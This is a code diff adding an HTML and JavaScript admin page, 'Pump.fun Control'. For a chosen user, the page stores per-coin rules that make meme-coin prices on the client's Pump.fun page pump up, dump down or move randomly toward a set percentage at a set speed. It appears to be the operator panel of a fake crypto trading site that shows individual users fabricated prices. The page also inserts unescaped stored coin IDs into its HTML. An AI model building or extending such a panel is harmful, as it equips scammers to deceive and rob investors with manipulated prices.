@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pump.fun Control</title>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg-gradient: radial-gradient(circle at top, #2e1065 0%, #070b19 100%);
+      --card-bg: rgba(30, 27, 75, 0.65);
+      --card-border: rgba(255,255,255,0.08);
+      --muted: #94a3b8;
+      --primary: #a78bfa;
+      --green: #10b981;
+    }
+    body {
+      background: var(--bg-gradient); background-attachment: fixed;
+      color: #fff; font-family: 'Plus Jakarta Sans', sans-serif;
+      margin: 0; padding: 16px; padding-bottom: 40px;
+    }
+    .container { max-width: 560px; margin: 0 auto; }
+    h1 {
+      margin: 0 0 8px; font-size: 1.3rem; font-weight: 800;
+      background: linear-gradient(90deg, #f472b6, #a78bfa);
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    }
+    .back { color: #c4b5fd; text-decoration: none; font-weight: 600; font-size: 0.85rem; display: inline-block; margin-bottom: 14px; }
+    .lock-banner {
+      display: flex; justify-content: space-between; align-items: center; gap: 10px;
+      background: rgba(251,191,36,0.12); border: 1px solid rgba(251,191,36,0.35);
+      border-radius: 14px; padding: 12px 14px; margin-bottom: 14px;
+    }
+    .lock-banner.unlocked { background: rgba(16,185,129,0.12); border-color: rgba(16,185,129,0.35); }
+    .lock-banner .msg { font-size: 0.82rem; font-weight: 600; color: #fbbf24; }
+    .lock-banner.unlocked .msg { color: #34d399; }
+    .edit-btn {
+      background: linear-gradient(135deg, #f59e0b, #d97706); color: #fff; border: none;
+      padding: 10px 14px; border-radius: 10px; font-weight: 700; cursor: pointer; flex-shrink: 0;
+    }
+    .card {
+      background: var(--card-bg); border: 1px solid var(--card-border);
+      border-radius: 16px; padding: 16px; margin-bottom: 12px;
+    }
+    .card.locked { opacity: 0.75; pointer-events: none; }
+    .card-title { font-size: 0.72rem; color: var(--muted); font-weight: 700; letter-spacing: 1px; text-transform: uppercase; margin: 0 0 12px; }
+    .toggle-row { display: flex; justify-content: space-between; align-items: center; }
+    .switch {
+      width: 48px; height: 26px; background: rgba(255,255,255,0.15); border-radius: 20px; position: relative; cursor: pointer;
+    }
+    .switch.on { background: var(--green); }
+    .switch::after {
+      content: ''; position: absolute; top: 3px; left: 3px; width: 20px; height: 20px;
+      background: #fff; border-radius: 50%; transition: 0.2s;
+    }
+    .switch.on::after { left: 25px; }
+    label { display: block; font-size: 0.72rem; color: var(--muted); font-weight: 700; text-transform: uppercase; margin-bottom: 5px; }
+    select, input {
+      width: 100%; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1);
+      color: #fff; padding: 11px; border-radius: 10px; margin-bottom: 10px; box-sizing: border-box;
+    }
+    select:disabled, input:disabled { opacity: 0.85; }
+    .coin-ctrl {
+      border: 1px solid rgba(255,255,255,0.08); border-radius: 12px; padding: 12px; margin-bottom: 10px;
+      background: rgba(0,0,0,0.2);
+    }
+    .coin-ctrl h4 { margin: 0 0 8px; font-size: 0.95rem; }
+    .row2 { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+    .btn-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 8px; }
+    .btn-row.one { grid-template-columns: 1fr; }
+    .save-btn {
+      background: linear-gradient(135deg, #a78bfa, #7c3aed); color: #fff; border: none;
+      padding: 14px; border-radius: 12px; font-weight: 700; width: 100%; cursor: pointer;
+    }
+    .save-btn:disabled { opacity: 0.5; }
+    .cancel-btn {
+      background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.12);
+      color: #e2e8f0; padding: 14px; border-radius: 12px; font-weight: 700; width: 100%; cursor: pointer;
+    }
+    .status { text-align: center; font-size: 0.85rem; font-weight: 600; margin-top: 10px; min-height: 20px; }
+    .hint { font-size: 0.75rem; color: var(--muted); line-height: 1.4; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Pump.fun Control</h1>
+    <a class="back" id="back-link" href="#">← Back to User Info</a>
+
+    <div class="lock-banner" id="lock-banner">
+      <div class="msg" id="lock-msg">🔒 Controls locked. Tap Edit to change.</div>
+      <button class="edit-btn" onclick="enterEdit()">Edit</button>
+    </div>
+
+    <div class="card locked" id="card-master">
+      <div class="card-title">Master</div>
+      <div class="toggle-row">
+        <span style="font-weight:600">Enable price control for this user</span>
+        <div class="switch" id="master" onclick="toggleMaster()"></div>
+      </div>
+      <p class="hint" style="margin-top:10px">When ON, selected meme coins move according to the rules below on the client Pump.fun page.</p>
+    </div>
+
+    <div class="card locked" id="card-default">
+      <div class="card-title">Default rule (all coins without custom rule)</div>
+      <label>Direction</label>
+      <select id="def-dir" disabled>
+        <option value="up">Pump up</option>
+        <option value="down">Dump down</option>
+        <option value="random">Random</option>
+      </select>
+      <div class="row2">
+        <div>
+          <label>Target %</label>
+          <input type="number" id="def-pct" value="8" min="0.1" max="500" step="0.1" disabled>
+        </div>
+        <div>
+          <label>Speed (1–20)</label>
+          <input type="number" id="def-speed" value="3" min="1" max="20" step="1" disabled>
+        </div>
+      </div>
+    </div>
+
+    <div class="card locked" id="card-coins">
+      <div class="card-title">Per-coin overrides</div>
+      <div id="coin-list"></div>
+    </div>
+
+    <div class="btn-row one" id="btn-row">
+      <button class="cancel-btn" id="cancel-btn" style="display:none" onclick="cancelEdit()">Cancel</button>
+      <button class="save-btn" id="save-btn" disabled onclick="save()">Save Pump Controls</button>
+    </div>
+    <div class="status" id="status"></div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <script src="config.js"></script>
+  <script>
+    var targetUserId = new URLSearchParams(location.search).get('id') || '';
+    document.getElementById('back-link').href = 'user-info.html?id=' + encodeURIComponent(targetUserId);
+
+    var POPULAR = ['PEPE','DOGE','SHIB','BONK','WIF','FLOKI','BRETT','POPCAT','NEIRO','MEME'];
+    var enabled = false;
+    var isEditing = false;
+    var snapshot = null;
+    var coinRules = {};
+
+    function setLocked(locked) {
+      isEditing = !locked;
+      ['card-master','card-default','card-coins'].forEach(function (id) {
+        document.getElementById(id).classList.toggle('locked', locked);
+      });
+      ['def-dir','def-pct','def-speed'].forEach(function (id) {
+        document.getElementById(id).disabled = locked;
+      });
+      document.getElementById('lock-banner').classList.toggle('unlocked', !locked);
+      document.getElementById('lock-msg').textContent = locked
+        ? '🔒 Controls locked. Tap Edit to change.'
+        : '✏️ Editing — change then Save.';
+      document.getElementById('save-btn').disabled = locked;
+      document.getElementById('cancel-btn').style.display = locked ? 'none' : 'block';
+      document.getElementById('btn-row').className = locked ? 'btn-row one' : 'btn-row';
+      renderCoins();
+    }
+
+    function toggleMaster() {
+      if (!isEditing) return;
+      enabled = !enabled;
+      document.getElementById('master').classList.toggle('on', enabled);
+    }
+
+    function enterEdit() {
+      snapshot = JSON.parse(JSON.stringify({
+        enabled: enabled,
+        defDir: document.getElementById('def-dir').value,
+        defPct: document.getElementById('def-pct').value,
+        defSpeed: document.getElementById('def-speed').value,
+        coinRules: coinRules
+      }));
+      setLocked(false);
+      document.getElementById('status').textContent = '';
+    }
+
+    function cancelEdit() {
+      if (snapshot) {
+        enabled = snapshot.enabled;
+        document.getElementById('master').classList.toggle('on', enabled);
+        document.getElementById('def-dir').value = snapshot.defDir;
+        document.getElementById('def-pct').value = snapshot.defPct;
+        document.getElementById('def-speed').value = snapshot.defSpeed;
+        coinRules = JSON.parse(JSON.stringify(snapshot.coinRules));
+      }
+      setLocked(true);
+    }
+
+    function renderCoins() {
+      // merge popular + any from localStorage global coins
+      var extra = [];
+      try {
+        var all = JSON.parse(localStorage.getItem('pump_fun_coins_v1') || '[]');
+        all.forEach(function (c) {
+          if (c && c.id && POPULAR.indexOf(c.id) < 0 && extra.indexOf(c.id) < 0) extra.push(c.id);
+        });
+      } catch (e) {}
+      var ids = POPULAR.concat(extra);
+      document.getElementById('coin-list').innerHTML = ids.map(function (id) {
+        var r = coinRules[id] || { enabled: false, direction: 'up', targetPct: 10, speed: 3 };
+        var dis = isEditing ? '' : 'disabled';
+        return '<div class="coin-ctrl"><h4>' + id + '</h4>' +
+          '<div class="toggle-row" style="margin-bottom:8px">' +
+          '<span style="font-size:0.85rem">Custom rule</span>' +
+          '<div class="switch ' + (r.enabled ? 'on' : '') + '" data-id="' + id + '" onclick="toggleCoin(this)"></div></div>' +
+          '<div class="row2"><div><label>Direction</label>' +
+          '<select data-f="direction" data-id="' + id + '" ' + dis + ' onchange="updCoin(this)">' +
+          '<option value="up"' + (r.direction==='up'?' selected':'') + '>Pump up</option>' +
+          '<option value="down"' + (r.direction==='down'?' selected':'') + '>Dump down</option>' +
+          '<option value="random"' + (r.direction==='random'?' selected':'') + '>Random</option>' +
+          '</select></div><div><label>Target %</label>' +
+          '<input type="number" data-f="targetPct" data-id="' + id + '" value="' + (r.targetPct||10) + '" ' + dis + ' onchange="updCoin(this)"></div></div>' +
+          '<label>Speed</label><input type="number" data-f="speed" data-id="' + id + '" value="' + (r.speed||3) + '" min="1" max="20" ' + dis + ' onchange="updCoin(this)">' +
+          '</div>';
+      }).join('');
+    }
+
+    function toggleCoin(el) {
+      if (!isEditing) return;
+      var id = el.getAttribute('data-id');
+      if (!coinRules[id]) coinRules[id] = { enabled: false, direction: 'up', targetPct: 10, speed: 3 };
+      coinRules[id].enabled = !coinRules[id].enabled;
+      el.classList.toggle('on', coinRules[id].enabled);
+    }
+
+    function updCoin(el) {
+      if (!isEditing) return;
+      var id = el.getAttribute('data-id');
+      var f = el.getAttribute('data-f');
+      if (!coinRules[id]) coinRules[id] = { enabled: true, direction: 'up', targetPct: 10, speed: 3 };
+      var v = el.value;
+      if (f === 'targetPct' || f === 'speed') v = parseFloat(v) || 0;
+      coinRules[id][f] = v;
+    }
+
+    function apply(c) {
+      if (!c) return;
+      enabled = !!c.enabled;
+      document.getElementById('master').classList.toggle('on', enabled);
+      var d = c.default || {};
+      document.getElementById('def-dir').value = d.direction || 'up';
+      document.getElementById('def-pct').value = d.targetPct != null ? d.targetPct : 8;
+      document.getElementById('def-speed').value = d.speed != null ? d.speed : 3;
+      coinRules = c.coins ? JSON.parse(JSON.stringify(c.coins)) : {};
+      renderCoins();
+    }
+
+    async function load() {
+      if (targetUserId) {
+        try {
+          var { data } = await client.from('profiles').select('pump_control').eq('id', targetUserId).maybeSingle();
+          if (data && data.pump_control) {
+            var c = typeof data.pump_control === 'string' ? JSON.parse(data.pump_control) : data.pump_control;
+            apply(c);
+            localStorage.setItem('pump_control_' + targetUserId, JSON.stringify(c));
+            setLocked(true);
+            return;
+          }
+        } catch (e) {}
+      }
+      try {
+        var raw = localStorage.getItem('pump_control_' + targetUserId);
+        if (raw) apply(JSON.parse(raw));
+        else renderCoins();
+      } catch (e) { renderCoins(); }
+      setLocked(true);
+    }
+
+    async function save() {
+      if (!isEditing || !targetUserId) {
+        document.getElementById('status').textContent = 'Open from a user.';
+        return;
+      }
+      var controls = {
+        enabled: enabled,
+        default: {
+          direction: document.getElementById('def-dir').value,
+          targetPct: parseFloat(document.getElementById('def-pct').value) || 8,
+          speed: parseFloat(document.getElementById('def-speed').value) || 3
+        },
+        coins: coinRules,
+        updatedAt: Date.now()
+      };
+      var st = document.getElementById('status');
+      var btn = document.getElementById('save-btn');
+      btn.disabled = true;
+      btn.textContent = 'Saving…';
+      localStorage.setItem('pump_control_' + targetUserId, JSON.stringify(controls));
+      var ok = false;
+      try {
+        var { error } = await client.from('profiles').update({ pump_control: controls }).eq('id', targetUserId);
+        if (!error) ok = true;
+        else st.textContent = 'Local save. DB: ' + error.message;
+      } catch (e) {
+        st.textContent = 'Saved locally only.';
+      }
+      btn.disabled = false;
+      btn.textContent = 'Save Pump Controls';
+      if (ok) {
+        st.style.color = '#34d399';
+        st.textContent = 'Saved & locked.';
+        setLocked(true);
+      } else {
+        st.style.color = '#fbbf24';
+      }
+    }
+
+    load();
+  </script>
+</body>
+</html>
